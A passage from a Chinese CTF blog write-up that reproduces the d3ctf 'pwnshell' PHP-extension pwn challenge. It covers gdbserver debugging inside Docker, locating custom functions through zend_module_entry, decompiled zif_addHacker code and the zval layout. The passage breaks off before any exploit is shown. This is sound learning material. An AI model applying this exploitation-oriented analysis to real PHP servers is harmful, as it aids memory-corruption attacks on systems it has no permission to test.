<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>d3ctf_pwnshell复现 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="pwnshell 复现 (php pwn)如何调试？php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了
能触发io中断的函数，比如说fgetc
&amp;lt;?php
$char = fgetc(STDIN);
echo &#34;You entered: $char\n&#34;;
?&gt;

在pwnshell这个题目中php配置文件里禁用了fgetc这个函数，修改php.ini中的disable_functions，把fgetc删掉就可以使用这个函数了
调试相关的命令安装gdbserver只需要在dockerfile里面加上安装的参数，之后构建镜像就好了
FROM php:8.3-apache

RUN DEBIAN_FRONTEND&amp;#x3D;noninteractive
RUN apt-get update &amp;amp;&amp;amp; apt-get install -y vim gdbserver

COPY .&amp;#x2F;stuff&amp;#x2F;php.ini &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;etc&amp;#x2F;php
COPY .&amp;#x2F;stuff&amp;#x2F;vuln.so &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;extensions&amp;#x2F;no-debug-non-zts-20230831
COPY .&amp;#x2F;stuff&amp;#x2F;readflag &amp;#x2F;
COPY .&amp;#x2F;flag.txt &amp;#x2F;flag.txt
COPY .&amp;#x2F;stuff&amp;#x2F;index.php &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html
RUN chmod 400 &amp;#x2F;flag.txt
RUN chmod u+sx &amp;#x2F;readflag
RUN chmod -R 777 &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="d3ctf_pwnshell复现"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> d3ctf_pwnshell复现</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="pwnshell-复现-php-pwn"><a href="#pwnshell-复现-php-pwn" class="headerlink" title="pwnshell 复现 (php pwn)"></a>pwnshell 复现 (php pwn)</h2><h3 id="如何调试？"><a href="#如何调试？" class="headerlink" title="如何调试？"></a>如何调试？</h3><p>php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了</p>
<p>能触发io中断的函数，比如说fgetc</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$char</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"You entered: <span class="token interpolation"><span class="token variable">$char</span></span>\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在pwnshell这个题目中php配置文件里禁用了fgetc这个函数，修改php.ini中的disable_functions，把fgetc删掉就可以使用这个函数了</p>
<h3 id="调试相关的命令"><a href="#调试相关的命令" class="headerlink" title="调试相关的命令"></a>调试相关的命令</h3><h4 id="安装gdbserver"><a href="#安装gdbserver" class="headerlink" title="安装gdbserver"></a>安装gdbserver</h4><p>只需要在dockerfile里面加上安装的参数，之后构建镜像就好了</p>
<pre class="line-numbers language-none"><code class="language-none">FROM php:8.3-apache

RUN DEBIAN_FRONTEND&#x3D;noninteractive
RUN apt-get update &amp;&amp; apt-get install -y vim gdbserver

COPY .&#x2F;stuff&#x2F;php.ini &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
COPY .&#x2F;stuff&#x2F;vuln.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20230831
COPY .&#x2F;stuff&#x2F;readflag &#x2F;
COPY .&#x2F;flag.txt &#x2F;flag.txt
COPY .&#x2F;stuff&#x2F;index.php &#x2F;var&#x2F;www&#x2F;html
RUN chmod 400 &#x2F;flag.txt
RUN chmod u+sx &#x2F;readflag
RUN chmod -R 777 &#x2F;var&#x2F;www&#x2F;html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><pre class="line-numbers language-none"><code class="language-none">docker build -t nyyyddddn&#x2F;pwnshell .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h4><p>多映射一个 8888端口用来调试</p>
<pre class="line-numbers language-none"><code class="language-none">docker run -d -p 9999:80 -p 8888:8888 nyyyddddn&#x2F;pwnshell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="gdbserver的使用"><a href="#gdbserver的使用" class="headerlink" title="gdbserver的使用"></a>gdbserver的使用</h4><p>gdbserver开启一个监听</p>
<pre class="line-numbers language-none"><code class="language-none">gdbserver :8888 php test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后使用gdb连接上去调试</p>
<pre class="line-numbers language-none"><code class="language-none">gdb -q \
-ex &quot;add-symbol-file vuln.so&quot; \
-ex &quot;target remote :8888&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>之后在vuln.so中打一个断点就好了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; b zif_addHacker
Breakpoint 1 at 0x1210
pwndbg&gt; c
Continuing.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>





<h3 id="如何分析程序逻辑"><a href="#如何分析程序逻辑" class="headerlink" title="如何分析程序逻辑"></a>如何分析程序逻辑</h3><p>php module 程序的入口点是get_module 这个函数，会返回一个zend_module_entry结构体指针，这个结构体用来描述要加载的自定义函数地址 和信息，可以通过分析这个结构体知道哪些函数是出题人自定义的函数，再去分析这些函数的逻辑寻址漏洞</p>
<p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/Zend/zend_modules.h">https://github.com/php/php-src/blob/master/Zend/zend_modules.h</a></p>
<p>php8.3中 _zend_module_enrty的结构</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_zend_module_entry</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> size<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> zend_api<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> zend_debug<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> zts<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_zend_ini_entry</span> <span class="token operator">*</span>ini_entry<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_zend_module_dep</span> <span class="token operator">*</span>deps<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_zend_function_entry</span> <span class="token operator">*</span>functions<span class="token punctuation">;</span>
	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>module_startup_func<span class="token punctuation">)</span><span class="token punctuation">(</span>INIT_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>module_shutdown_func<span class="token punctuation">)</span><span class="token punctuation">(</span>SHUTDOWN_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>request_startup_func<span class="token punctuation">)</span><span class="token punctuation">(</span>INIT_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>request_shutdown_func<span class="token punctuation">)</span><span class="token punctuation">(</span>SHUTDOWN_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>info_func<span class="token punctuation">)</span><span class="token punctuation">(</span>ZEND_MODULE_INFO_FUNC_ARGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>version<span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> globals_size<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">ZTS</span></span>
	ts_rsrc_id<span class="token operator">*</span> globals_id_ptr<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
	<span class="token keyword">void</span><span class="token operator">*</span> globals_ptr<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>globals_ctor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>globals_dtor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">zend_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>post_deactivate_func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> module_started<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> type<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>handle<span class="token punctuation">;</span>
	<span class="token keyword">int</span> module_number<span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>build_id<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以 从functions指针跟过去后可以发现出题人自定义的函数有四个，分别是addHacker removeHacker displayHacker editHacker</p>
<pre class="line-numbers language-none"><code class="language-none">.data:000000000000409F 00                            db    0
.data:00000000000040A0 03 20 00 00 00 00 00 00       dq offset aVuln                         ; &quot;vuln&quot;
.data:00000000000040A8 60 3D 00 00 00 00 00 00       dq offset off_3D60                      ; &quot;addHacker&quot;
.data:00000000000040B0 C0 11 00 00 00 00 00 00       dq offset zm_startup_vuln
.data:00000000000040B8 00 12 00 00 00 00 00 00       dq offset zm_shutdown_vuln
.data:00000000000040C0 00                            db    0


.data.rel.ro:0000000000003D60 1E 20 00 00 00 00 00 00       off_3D60 dq offset aAddhacker           ; DATA XREF: .data:00000000000040A8↓o
.data.rel.ro:0000000000003D60                                                                       ; &quot;addHacker&quot;
.data.rel.ro:0000000000003D68 10 12 00 00 00 00 00 00       dq offset zif_addHacker
.data.rel.ro:0000000000003D70 00 3D 00 00 00 00 00 00       dq offset unk_3D00
.data.rel.ro:0000000000003D78 02                            db    2
.data.rel.ro:0000000000003D79 00                            db    0
.data.rel.ro:0000000000003D7A 00                            db    0
.data.rel.ro:0000000000003D7B 00                            db    0
.data.rel.ro:0000000000003D7C 00                            db    0
.data.rel.ro:0000000000003D7D 00                            db    0
.data.rel.ro:0000000000003D7E 00                            db    0
.data.rel.ro:0000000000003D7F 00                            db    0
.data.rel.ro:0000000000003D80 28 20 00 00 00 00 00 00       dq offset aRemovehacker                 ; &quot;removeHacker&quot;
.data.rel.ro:0000000000003D88 50 13 00 00 00 00 00 00       dq offset zif_removeHacker
.data.rel.ro:0000000000003D90 C0 3C 00 00 00 00 00 00       dq offset unk_3CC0
.data.rel.ro:0000000000003D98 01                            db    1
.data.rel.ro:0000000000003D99 00                            db    0
.data.rel.ro:0000000000003D9A 00                            db    0
.data.rel.ro:0000000000003D9B 00                            db    0
.data.rel.ro:0000000000003D9C 00                            db    0
.data.rel.ro:0000000000003D9D 00                            db    0
.data.rel.ro:0000000000003D9E 00                            db    0
.data.rel.ro:0000000000003D9F 00                            db    0
.data.rel.ro:0000000000003DA0 35 20 00 00 00 00 00 00       dq offset aDisplayhacker                ; &quot;displayHacker&quot;
.data.rel.ro:0000000000003DA8 20 15 00 00 00 00 00 00       dq offset zif_displayHacker
.data.rel.ro:0000000000003DB0 80 3C 00 00 00 00 00 00       dq offset unk_3C80
.data.rel.ro:0000000000003DB8 01                            db    1
.data.rel.ro:0000000000003DB9 00                            db    0
.data.rel.ro:0000000000003DBA 00                            db    0
.data.rel.ro:0000000000003DBB 00                            db    0
.data.rel.ro:0000000000003DBC 00                            db    0
.data.rel.ro:0000000000003DBD 00                            db    0
.data.rel.ro:0000000000003DBE 00                            db    0
.data.rel.ro:0000000000003DBF 00                            db    0
.data.rel.ro:0000000000003DC0 43 20 00 00 00 00 00 00       dq offset aEdithacker                   ; &quot;editHacker&quot;
.data.rel.ro:0000000000003DC8 10 14 00 00 00 00 00 00       dq offset zif_editHacker
.data.rel.ro:0000000000003DD0 20 3C 00 00 00 00 00 00       dq offset unk_3C20
.data.rel.ro:0000000000003DD8 02                            db    2
.data.rel.ro:0000000000003DD9 00                            db    0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="zif-addHacker"><a href="#zif-addHacker" class="headerlink" title="zif_addHacker"></a>zif_addHacker</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">zif_addHacker</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  _BYTE <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// r12</span>
  _QWORD <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token class-name">size_t</span> v10<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
  _BYTE <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment">// r13</span>
  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _BYTE <span class="token operator">*</span>arg2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-40h] BYREF</span>
  _BYTE <span class="token operator">*</span>arg1<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-38h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-30h]</span>

  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2000<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> arg1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> arg2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token operator">++</span>v5<span class="token punctuation">;</span>
        v6 <span class="token operator">+=</span> <span class="token number">16</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">16</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      v2 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
LABEL_9<span class="token operator">:</span>
      v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v2<span class="token punctuation">;</span>
      v8 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg2 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg1 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span>v8 <span class="token operator">=</span> v9<span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg1 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg1 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v11<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> arg2<span class="token punctuation">;</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg2 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>arg2 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v8 <span class="token operator">+</span> v13 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v16 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23">https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23</a></p>
<p>zend_parse_parameters是一个可变参数函数，用途是根据指定的格式字符串解析和验证传入的参数，并将解析后的值存储在相应的变量中。</p>
<pre class="line-numbers language-none"><code class="language-none">ZEND_API zend_result zend_parse_parameters(uint32_t num_args, const char *type_spec, ...);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="php变量类型的表示方法"><a href="#php变量类型的表示方法" class="headerlink" title="php变量类型的表示方法"></a>php变量类型的表示方法</h5><p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23">https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23</a></p>
<p>php是一门动态类型语言，变量可以存储任何类型的数据，并且变量的类型可以在程序执行期间发生变化，在zend引擎中变量是由一个叫做zval的结构体去描述的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_zval_struct</span>     zval<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_zval_struct</span> <span class="token punctuation">&#123;</span>
	zend_value        value<span class="token punctuation">;</span>			<span class="token comment">/* value */</span>
	<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">uint32_t</span> type_info<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
			<span class="token function">ZEND_ENDIAN_LOHI_3</span><span class="token punctuation">(</span>
				<span class="token class-name">uint8_t</span>    type<span class="token punctuation">,</span>			<span class="token comment">/* active type */</span>
				<span class="token class-name">uint8_t</span>    type_flags<span class="token punctuation">,</span>
				<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
					<span class="token class-name">uint16_t</span>  extra<span class="token punctuation">;</span>        <span class="token comment">/* not further specified */</span>
				<span class="token punctuation">&#125;</span> u<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span> v<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> u1<span class="token punctuation">;</span>
	<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
